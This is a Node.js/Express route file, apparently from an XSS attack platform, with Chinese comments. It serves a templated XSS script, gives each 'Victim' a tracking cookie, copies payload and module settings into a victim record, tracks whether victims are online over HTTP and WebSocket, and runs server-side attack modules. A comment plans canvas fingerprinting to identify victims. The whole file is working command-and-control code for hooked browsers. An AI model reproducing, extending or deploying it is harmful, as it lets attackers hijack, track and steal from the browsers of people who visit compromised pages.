exports.xss = function(req, res){
    //  返回XSSJS 框架
    res.header('Content-Type', 'application/javascript');
    return res.render('bungeegum', {
        domain:req.header('host'),
        id:req.query.i
    });
};
exports.load = function(req, res){
    //  返回模块
    //  TODO who id use "Canvas Fingerprinting"
    var id = req.param('i');
    var who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info){
            return res.jsonp(info.load);
        };
        //  若数据库内无Victim，则创建之
        sql.Item.findById(id, function(err, info){
            if(!info){
                return res.json({
                    error:'Not found.'
                });
            };
            who = getmd5(info.owner+id+Date.now());
            res.cookie('who', who);
            //  继承item的配置
            sql.Victim.create({
                owner:info.owner,
                who:who,
                name:info.name+Date.now(),
                payload:info.payload,
                modules:info.modules,
                status:{},
                now:Date.now()
            }, function(){
                return res.jsonp(info.load);
            });
        });
    });
};

function online(who, on){
    //  是否在线？
    sql.Victim.findOne({who:who}, function(err, info){
        info&&sql.Victim.update({who:who}, {
            now:on
        });
    });
};
function handle(re, modules, owner, victim, who, type){
    //  处理服务端模块
    var share = {};
    modules.forEach(function(n){
        var m = require('./'+n[0]);
        if(m.type!=type){return null};
        if(typeof share[n[0]] != 'object'){
            share[n[0]] = [];
        };
        share[n[0]].unshift(
            m(re, owner, n[1], victim, who, share)
        );
    });
};

exports.http = function(req, res){
    //  HTTP页面
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info||info.type != 'http'){return err404(req, res)};
        var owner = req.session.user&&(req.session.user.name == info.owner);
        !owner&&online(who, Date.now());
        handle({q:req, s:res}, info.modules, owner, sql.Victim, who, 'http');
    });
};
exports.ws = function(ws, req){
    // WebSocket页面
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info||info.type != 'ws'){return null};
        var owner = req.session.user&&(req.session.user.name == info.owner);
        ws.on('open', function(){
            return !owner&&online(who, 'online');
        });
        ws.on('close', function(){
            return !owner&&online(who, Date.now());
        });
        ws.on('message', function(msg){
            handle({q:req, s:ws}, info.modules, owner, sql.Victim, who, 'ws');
        });
    });
};
